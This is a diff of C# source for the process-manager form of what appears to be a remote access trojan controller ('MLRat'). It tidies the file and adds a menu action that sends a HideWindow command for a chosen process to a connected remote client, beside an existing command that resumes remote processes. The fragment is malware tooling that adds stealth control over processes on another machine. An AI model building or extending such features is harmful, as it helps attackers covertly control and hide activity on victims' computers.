@@ -1,5 +1,4 @@
 ﻿using MLRat.Server;
-using SharedCode.CustomObjects;
 using SharedCode.Network;
 using System;
 using System.Collections.Generic;
@@ -20,7 +19,7 @@ namespace MLManagementServer.Forms
         {
             InitializeComponent();
             Client = c;
-            Image standardProc = ui.GetImage("cpu.png");
+            Image standardProc = ui.GetImage("service.png");
             Image thisProc = ui.GetImage("bug.png");
             Image appImage = ui.GetImage("application.png");
             ImageList images = new ImageList();
@@ -71,12 +70,6 @@ namespace MLManagementServer.Forms
                 lvProcessList.Items.Add(i);
             });
         }
-
-        public void UpdateProcesses(TrimProcess[] procs)
-        {
-            
-        }
-
         void AddProcToList(ListViewItem i)
         {
             Invoke((MethodInvoker)delegate ()
@@ -131,6 +124,15 @@ namespace MLManagementServer.Forms
             ListViewItem i = lvProcessList.SelectedItems[0];
             int id = (int)i.Tag;
             Client.Send((byte)NetworkCommand.ResumeProcess, id);
+        }
+
+        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (lvProcessList.SelectedItems.Count < 1)
+                return;
+            ListViewItem i = lvProcessList.SelectedItems[0];
+            int id = (int)i.Tag;
+            Client.Send((byte)NetworkCommand.HideWindow, id);
         }
     }
 }
